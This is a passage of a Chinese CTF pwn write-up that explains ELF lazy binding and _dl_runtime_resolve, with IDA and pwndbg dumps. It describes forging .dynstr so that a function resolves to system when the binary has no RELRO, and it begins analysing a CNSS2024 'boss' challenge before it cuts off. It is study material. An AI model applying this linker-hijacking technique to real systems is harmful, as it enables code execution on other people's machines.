<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E60</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">8</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_INIT_ARRAYSZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E70</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Ah</span><span class="p">,</span> <span class="mf">403E18</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_FINI_ARRAY</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E80</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">1</span><span class="n">Ch</span><span class="p">,</span> <span class="mi">8</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_FINI_ARRAYSZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mf">0000000000403E90</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFEF5h</span><span class="p">,</span> <span class="mi">4003</span><span class="n">A0h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_GNU_HASH</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EA0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">5</span><span class="p">,</span> <span class="mi">400420</span><span class="n">h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_STRTAB</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EB0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="p">,</span> <span class="mi">4003</span><span class="n">C0h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_SYMTAB</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EC0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Ah</span><span class="p">,</span> <span class="mi">48</span><span class="n">h</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">DT_STRSZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">ED0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="n">Bh</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>    <span class="p">;</span> <span class="n">DT_SYMENT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EE0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">15</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_DEBUG</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">EF0</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">3</span><span class="p">,</span> <span class="mi">404000</span><span class="n">h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_PLTGOT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F00</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">2</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_PLTRELSZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F10</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">14</span><span class="n">h</span><span class="p">,</span> <span class="mi">7</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_PLTREL</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F20</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">17</span><span class="n">h</span><span class="p">,</span> <span class="mi">4004</span><span class="n">D0h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_JMPREL</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F30</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">7</span><span class="p">,</span> <span class="mi">4004</span><span class="n">A0h</span><span class="o">&gt;</span>  <span class="p">;</span> <span class="n">DT_RELA</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F40</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">8</span><span class="p">,</span> <span class="mi">30</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_RELASZ</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F50</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">9</span><span class="p">,</span> <span class="mi">18</span><span class="n">h</span><span class="o">&gt;</span>      <span class="p">;</span> <span class="n">DT_RELAENT</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F60</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFFEh</span><span class="p">,</span> <span class="mi">400470</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_VERNEED</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F70</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFFFh</span><span class="p">,</span> <span class="mi">1</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_VERNEEDNUM</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F80</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">6</span><span class="n">FFFFFF0h</span><span class="p">,</span> <span class="mi">400468</span><span class="n">h</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">DT_VERSYM</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000403</span><span class="n">F90</span>                 <span class="n">Elf64_Dyn</span> <span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span>           <span class="p">;</span> <span class="n">DT_NULL</span>
</code></pre></div></div> <h5 id="注意关注来自deepunkicudt_rel-动态链接重定位表地址dt_symtab-动态链接符号表地址dt_strtab-动态链接字符串表地址dt_init-初始化代码地址dt_fini-结束代码地址">   注意关注（来自deepunk.icu）<br/>   DT_REL 动态链接重定位表地址<br/>   DT_SYMTAB 动态链接符号表地址<br/>   DT_STRTAB 动态链接字符串表地址<br/>   DT_INIT 初始化代码地址<br/>   DT_FINI 结束代码地址<br/></h5> <h5 id="dynstr动态链接中的字符串可以从上面的结构体可以寻址可以看到我们使用的puts我们主要关注函数名字符串比如说在no-relro时可以篡改dynamic中指向该段结构的地址指向提前伪造好的dynstr然后触发某函数的重定位这个函数就被重定位到了伪造段中包含的system字样partial-relro-或者-full-relro时这段内存不可写这种方法就使用不了">   .dynstr，动态链接中的字符串，可以从上面的结构体可以寻址。可以看到我们使用的<code class="language-plaintext highlighter-rouge">puts()</code><br/>   我们主要关注函数名字符串，比如说在<code class="language-plaintext highlighter-rouge">no RELRO</code>时，可以篡改<code class="language-plaintext highlighter-rouge">.dynamic</code>中指向该段结构的地址指向提前伪造好的<code class="language-plaintext highlighter-rouge">.dynstr</code>，然后触发某函数的重定位，这个函数就被重定位到了伪造段中包含的<code class="language-plaintext highlighter-rouge">system</code>字样。<code class="language-plaintext highlighter-rouge">partial RELRO</code> 或者 <code class="language-plaintext highlighter-rouge">full RELRO</code>时，这段内存不可写，这种方法就使用不了。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mo">0000000000400420</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">String</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400420</span> <span class="n">unk_400420</span>      <span class="n">db</span>    <span class="mi">0</span>                 <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">D8</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400420</span>                                         <span class="p">;</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">F0</span><span class="err">↑</span><span class="n">o</span> <span class="p">...</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400421</span> <span class="n">aLibcStartMain</span>  <span class="n">db</span> <span class="err">'</span><span class="n">__libc_start_main</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400421</span>                                         <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">D8</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400433</span> <span class="n">aPuts</span>           <span class="n">db</span> <span class="err">'</span><span class="n">puts</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>             <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">F0</span><span class="err">↑</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040043</span><span class="mi">8</span> <span class="n">aLibcSo6</span>        <span class="n">db</span> <span class="err">'</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>        <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400470</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">0000000000400442</span> <span class="n">aGlibc225</span>       <span class="n">db</span> <span class="err">'</span><span class="n">GLIBC_2</span><span class="p">.</span><span class="mi">2</span><span class="p">.</span><span class="mi">5</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>      <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="mi">80</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040044</span><span class="n">E</span> <span class="n">aGlibc234</span>       <span class="n">db</span> <span class="err">'</span><span class="n">GLIBC_2</span><span class="p">.</span><span class="mi">34</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>       <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="mi">90</span><span class="err">↓</span><span class="n">o</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040045</span><span class="mi">9</span> <span class="n">aGmonStart</span>      <span class="n">db</span> <span class="err">'</span><span class="n">__gmon_start__</span><span class="err">'</span><span class="p">,</span><span class="mi">0</span>   <span class="p">;</span> <span class="n">DATA</span> <span class="n">XREF</span><span class="o">:</span> <span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040040</span><span class="mi">8</span><span class="err">↑</span><span class="n">o</span>
</code></pre></div></div> <h5 id="dynsym这里是一堆符号表结构体还是主要关注函数的结构体">   .dynsym，这里是一堆符号表结构体，还是主要关注函数的结构体</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mo">00000000004003</span><span class="n">C0</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">Symbol</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">C0</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="mi">0</span><span class="o">&gt;</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">D8</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="n">offset</span> <span class="n">aLibcStartMain</span> <span class="o">-</span> <span class="n">offset</span> <span class="n">unk_400420</span><span class="p">,</span> <span class="mi">12</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">"__libc_start_main"</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004003</span><span class="n">F0</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="n">offset</span> <span class="n">aPuts</span> <span class="o">-</span> <span class="n">offset</span> <span class="n">unk_400420</span><span class="p">,</span> <span class="mi">12</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">"puts"</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">000000000040040</span><span class="mi">8</span>                 <span class="n">Elf64_Sym</span> <span class="o">&lt;</span><span class="n">offset</span> <span class="n">aGmonStart</span> <span class="o">-</span> <span class="n">offset</span> <span class="n">unk_400420</span><span class="p">,</span> <span class="mi">20</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="s">"__gmon_start__"</span>
</code></pre></div></div> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
	<span class="n">Elf64_Word</span> <span class="n">st_name</span><span class="p">;</span> <span class="cm">/* 存的是.dynstr 中的偏移值 */</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_info</span><span class="p">;</span> <span class="cm">/* 对于导入函数符号而言，它是0x12 */</span>
	<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">st_other</span><span class="p">;</span> 
	<span class="n">Elf64_Section</span> <span class="n">st_shndx</span><span class="p">;</span> 
	<span class="n">Elf64_Addr</span> <span class="n">st_value</span><span class="p">;</span> 
	<span class="n">Elf64_Xword</span> <span class="n">st_size</span><span class="p">;</span> 
<span class="p">}</span> <span class="n">Elf64_Sym</span><span class="p">;</span>
<span class="c1">// 对于函数来说，3、4、5、6都是0</span>
</code></pre></div></div> <h5 id="reldyndt_rela和relpltdt_jmprel被称为动态链接重定位表reldyn用于修正data和got中的数据引用函数的信息不在这里一般也不是很关注这个relplt这个段和之前的rel_arg直接相关并且用于修正gotplt俗称的got表在32位中rel_arg是用于计算它的偏移64位里直接就是下标deepunkicu">   .rel.dyn（DT_RELA）和.rel.plt（DT_JMPREL），被称为<code class="language-plaintext highlighter-rouge">动态链接重定位表</code><br/>   .rel.dyn,用于修正<code class="language-plaintext highlighter-rouge">.data</code>和<code class="language-plaintext highlighter-rouge">.got</code>中的数据引用，函数的信息不在这里，一般也不是很关注这个<br/>   .rel.plt这个段和之前的<code class="language-plaintext highlighter-rouge">rel_arg</code>直接相关，并且用于修正<code class="language-plaintext highlighter-rouge">.got.plt</code>（俗称的got表）。在32位中<code class="language-plaintext highlighter-rouge">rel_arg</code>是用于计算它的偏移，64位里直接就是下标（deepunk.icu）；</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">LOAD:</span><span class="mo">00000000004004</span><span class="n">A0</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">RELA</span> <span class="n">Relocation</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">A0</span>                 <span class="n">Elf64_Rela</span> <span class="o">&lt;</span><span class="mi">403</span><span class="n">FF0h</span><span class="p">,</span> <span class="mi">100000006</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">R_X86_64_GLOB_DAT</span> <span class="n">__libc_start_main</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">B8</span>                 <span class="n">Elf64_Rela</span> <span class="o">&lt;</span><span class="mi">403</span><span class="n">FF8h</span><span class="p">,</span> <span class="mi">300000006</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">R_X86_64_GLOB_DAT</span> <span class="n">__gmon_start__</span>

<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">D0</span> <span class="p">;</span> <span class="n">ELF</span> <span class="n">JMPREL</span> <span class="n">Relocation</span> <span class="n">Table</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">D0</span>                 <span class="n">Elf64_Rela</span> <span class="o">&lt;</span><span class="mi">404018</span><span class="n">h</span><span class="p">,</span> <span class="mi">200000007</span><span class="n">h</span><span class="p">,</span> <span class="mi">0</span><span class="o">&gt;</span> <span class="p">;</span> <span class="n">R_X86_64_JUMP_SLOT</span> <span class="n">puts</span>
<span class="n">LOAD</span><span class="o">:</span><span class="mo">00000000004004</span><span class="n">D0</span> <span class="n">LOAD</span>            <span class="n">ends</span>
</code></pre></div></div> <h5 id="64位和32位的结构体不一样结构体示例对比一下deepunkicu">   64位和32位的结构体不一样，结构体示例对比一下。（deepunk.icu）<br/>   </h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
	<span class="n">Elf32_Addr</span> <span class="n">r_offset</span><span class="p">;</span> <span class="cm">/* Address */</span>
	<span class="n">Elf32_Word</span> <span class="n">r_info</span><span class="p">;</span> <span class="cm">/* Relocation type and symbol index */</span>
<span class="p">}</span> <span class="n">Elf32_Rel</span><span class="p">;</span>

<span class="k">typedef</span> <span class="k">struct</span>
<span class="p">{</span>
	<span class="n">Elf64_Addr</span> <span class="n">r_offset</span><span class="p">;</span> <span class="cm">/* Address */</span>
	<span class="n">Elf64_Xword</span> <span class="n">r_info</span><span class="p">;</span> <span class="cm">/* Relocation type and symbol index */</span>
<span class="p">}</span> <span class="n">Elf64_Rel</span><span class="p">;</span>
</code></pre></div></div> <h5 id="rel_arg了解之后再来解决一下上面遗留的link_map结构体可以看到存储的是被链接的文件以及它们对应的dynamic以及加载地址偏移由于-no-pie所以执行文件加载地址是0x0之前push的是执行文件的linkmap也就是第一个">   <code class="language-plaintext highlighter-rouge">rel_arg</code>了解之后，再来解决一下上面遗留的<code class="language-plaintext highlighter-rouge">link_map</code>结构体。可以看到存储的是被链接的文件，以及它们对应的<code class="language-plaintext highlighter-rouge">.dynamic</code>以及加载地址偏移（由于<code class="language-plaintext highlighter-rouge">-no-pie</code>所以执行文件加载地址是<code class="language-plaintext highlighter-rouge">0x0</code>）,之前<code class="language-plaintext highlighter-rouge">push</code>的是执行文件的linkmap，也就是第一个</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Node</span>           <span class="n">Objfile</span>                                         <span class="n">Load</span> <span class="n">Bias</span>      <span class="n">Dynamic</span> <span class="n">Segment</span> 
<span class="mh">0x7ffff7ffe2e0</span> <span class="o">&lt;</span><span class="n">Unknown</span><span class="p">,</span> <span class="n">likely</span> <span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">testtable</span><span class="o">/</span><span class="n">lazy_load</span><span class="o">&gt;</span> <span class="mh">0x0</span>            <span class="mh">0x403e20</span>        
<span class="mh">0x7ffff7ffe890</span> <span class="n">linux</span><span class="o">-</span><span class="n">vdso</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">1</span>                                 <span class="mh">0x7ffff7fc1000</span> <span class="mh">0x7ffff7fc13a0</span>  
<span class="mh">0x7ffff7fbb160</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">x86_64</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">gnu</span><span class="o">/</span><span class="n">libc</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">6</span>                 <span class="mh">0x7ffff7d83000</span> <span class="mh">0x7ffff7f9cbc0</span>  
<span class="mh">0x7ffff7ffdaf0</span> <span class="o">/</span><span class="n">lib64</span><span class="o">/</span><span class="n">ld</span><span class="o">-</span><span class="n">linux</span><span class="o">-</span><span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">.</span><span class="n">so</span><span class="p">.</span><span class="mi">2</span>                     <span class="mh">0x7ffff7fc3000</span> <span class="mh">0x7ffff7ffce80</span> 
</code></pre></div></div> <h5 id="以其中的libcso6为例看看dynamic的结构与执行文件对比一下">   以其中的libc.so.6为例，看看<code class="language-plaintext highlighter-rouge">.dynamic</code>的结构，与执行文件对比一下。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span> <span class="mh">0x7ffff7f9cbc0</span>
<span class="mh">0x7ffff7f9cbc0</span><span class="o">:</span> <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000007d69</span>
<span class="mh">0x7ffff7f9cbd0</span><span class="o">:</span> <span class="mh">0x000000000000000e</span>      <span class="mh">0x0000000000007d7e</span>
<span class="mh">0x7ffff7f9cbe0</span><span class="o">:</span> <span class="mh">0x0000000000000019</span>      <span class="mh">0x0000000000216900</span>
<span class="mh">0x7ffff7f9cbf0</span><span class="o">:</span> <span class="mh">0x000000000000001b</span>      <span class="mh">0x0000000000000010</span>
<span class="mh">0x7ffff7f9cc00</span><span class="o">:</span> <span class="mh">0x0000000000000004</span>      <span class="mh">0x00007ffff7f939f8</span>
<span class="mh">0x7ffff7f9cc10</span><span class="o">:</span> <span class="mh">0x000000006ffffef5</span>      <span class="mh">0x00007ffff7d833c8</span>
<span class="mh">0x7ffff7f9cc20</span><span class="o">:</span> <span class="mh">0x0000000000000005</span>      <span class="mh">0x00007ffff7d99650</span>
<span class="mh">0x7ffff7f9cc30</span><span class="o">:</span> <span class="mh">0x0000000000000006</span>      <span class="mh">0x00007ffff7d87ad0</span>
<span class="mh">0x7ffff7f9cc40</span><span class="o">:</span> <span class="mh">0x000000000000000a</span>      <span class="mh">0x0000000000007f15</span>
<span class="mh">0x7ffff7f9cc50</span><span class="o">:</span> <span class="mh">0x000000000000000b</span>      <span class="mh">0x0000000000000018</span>
<span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span>  <span class="mh">0x403e20</span>
<span class="mh">0x403e20</span><span class="o">:</span>       <span class="mh">0x0000000000000001</span>      <span class="mh">0x0000000000000018</span>
<span class="mh">0x403e30</span><span class="o">:</span>       <span class="mh">0x000000000000000c</span>      <span class="mh">0x0000000000401000</span>
<span class="mh">0x403e40</span><span class="o">:</span>       <span class="mh">0x000000000000000d</span>      <span class="mh">0x000000000040114c</span>
<span class="mh">0x403e50</span><span class="o">:</span>       <span class="mh">0x0000000000000019</span>      <span class="mh">0x0000000000403e10</span>
<span class="mh">0x403e60</span><span class="o">:</span>       <span class="mh">0x000000000000001b</span>      <span class="mh">0x0000000000000008</span>
<span class="mh">0x403e70</span><span class="o">:</span>       <span class="mh">0x000000000000001a</span>      <span class="mh">0x0000000000403e18</span>
<span class="mh">0x403e80</span><span class="o">:</span>       <span class="mh">0x000000000000001c</span>      <span class="mh">0x0000000000000008</span>
<span class="mh">0x403e90</span><span class="o">:</span>       <span class="mh">0x000000006ffffef5</span>      <span class="mh">0x00000000004003a0</span>
<span class="mh">0x403ea0</span><span class="o">:</span>       <span class="mh">0x0000000000000005</span>      <span class="mh">0x0000000000400420</span>
<span class="mh">0x403eb0</span><span class="o">:</span>       <span class="mh">0x0000000000000006</span>      <span class="mh">0x00000000004003c0</span>
</code></pre></div></div> <h5 id="可以看到两个链接文件的elf64_dyn的类型基本一致说明两个文件的有关动态链接的结构相似的后面所指向的诸如dynstrdynsymrelplt地址是不一样的是各自的真实地址">   可以看到两个链接文件的ELF64_Dyn的类型基本一致，说明两个文件的有关动态链接的结构相似的，后面所指向的诸如<code class="language-plaintext highlighter-rouge">.dynstr</code>、<code class="language-plaintext highlighter-rouge">.dynsym</code>、<code class="language-plaintext highlighter-rouge">.rel.plt</code>地址是不一样的，是各自的真实地址。</h5> <h5 id="现在简单解释感性的理解_dl_runtime_reslovelink_map-rel_arg是如何借助这些结构重定位某一个函数第一步借助link_map找到dynamic的加载地址进而找到relplt的位置第二步借助rel_arg作为偏移或者下标找到的relplt中指定函数的动态链接重定位表第三步取出动态链接重定位表中的r_offset用于找到gotplt的位置既got表第四步取出动态链接重定位表中的r_info找到函数的动态链接重定位表取出其中的st_name既dynstr中的函数名字符">   现在简单解释（感性的理解）<code class="language-plaintext highlighter-rouge">_dl_runtime_reslove(link_map, rel_arg)</code>是如何借助这些结构重定位某一个函数。<br/>   第一步，借助<code class="language-plaintext highlighter-rouge">link_map</code>找到<code class="language-plaintext highlighter-rouge">.dynamic</code>的加载地址，进而找到<code class="language-plaintext highlighter-rouge">.rel.plt</code>的位置。<br/>   第二步，借助<code class="language-plaintext highlighter-rouge">rel_arg</code>（作为偏移或者下标），找到的<code class="language-plaintext highlighter-rouge">.rel.plt</code>中指定函数的<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>。<br/>   第三步，取出<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>中的<code class="language-plaintext highlighter-rouge">r_offset</code>，用于找到<code class="language-plaintext highlighter-rouge">.got.plt</code>的位置（既got表）<br/>   第四步，取出<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>中的<code class="language-plaintext highlighter-rouge">r_info</code>，找到函数的<code class="language-plaintext highlighter-rouge">动态链接重定位表</code>，取出其中的<code class="language-plaintext highlighter-rouge">st_name</code>，既<code class="language-plaintext highlighter-rouge">.dynstr</code>中的函数名字符。</h5> <h3 id="一点补充有关-fcf-protection">一点补充（有关-fcf-protection）</h3> <h5 id="这是ubuntu的gcc默认开启的一项保护措施在第一次函数调用时不会按照上面的流程而是直接到glibc中详情参考httpswwwsoinsidecomquestionaenbeapagmmbfzpviveobc">   这是ubuntu的gcc默认开启的一项保护措施，在第一次函数调用时，不会按照上面的流程，而是直接到glibc中，详情参考https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc</h5> <h3 id="攻击手段">攻击手段</h3> <h5 id="现在来具体分析一下这道boss题怎么做由于给出了source-code所以我们自己编译一个方便调试的执行文件并且把随机数那一部分去掉指令和上面那个demo一样">   现在来具体分析一下这道boss题怎么做。由于给出了source code所以我们自己编译一个方便调试的执行文件，并且把随机数那一部分去掉，指令和上面那个demo一样<br/></h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">'</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">pwn</span><span class="o">/</span><span class="n">worktable</span><span class="o">/</span><span class="n">cnss2024</span><span class="o">/</span><span class="n">boss</span><span class="o">/</span><span class="n">src</span><span class="o">/</span><span class="n">attachment</span><span class="err">'</span>
    <span class="n">Arch</span><span class="o">:</span>       <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
    <span class="n">RELRO</span><span class="o">:</span>      <span class="n">Partial</span> <span class="n">RELRO</span>   <span class="o">&lt;---------</span>
    <span class="n">Stack</span><span class="o">:</span>      <span class="n">Canary</span> <span class="n">found</span>
    <span class="n">NX</span><span class="o">:</span>         <span class="n">NX</span> <span class="n">enabled</span>
    <span class="n">PIE</span><span class="o">:</span>        <span class="n">PIE</span> <span class="n">enabled</span>
    <span class="n">SHSTK</span><span class="o">:</span>      <span class="n">Enabled</span>
    <span class="n">IBT</span><span class="o">:</span>        <span class="n">Enabled</span>
</code></pre></div></div> <h5 id="首先来到init函数passwd指向一个mmap出来的空间passwd本身在bss的最高位置然后在这个空间中写入随机数最后把前八位换成固定的deadbeef字符串这样总共就有0x10个已写入字符">   首先来到<code class="language-plaintext highlighter-rouge">init()</code>函数，<code class="language-plaintext highlighter-rouge">passwd</code>指向一个<code class="language-plaintext highlighter-rouge">mmap()</code>出来的空间，<code class="language-plaintext highlighter-rouge">passwd</code>本身在<code class="language-plaintext highlighter-rouge">.bss</code>的最高位置。然后在这个空间中写入随机数，最后把前八位换成固定的<code class="language-plaintext highlighter-rouge">deadbeef</code>字符串，这样总共就有0x10个已写入字符。</h5> <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">init</span><span class="p">(){</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
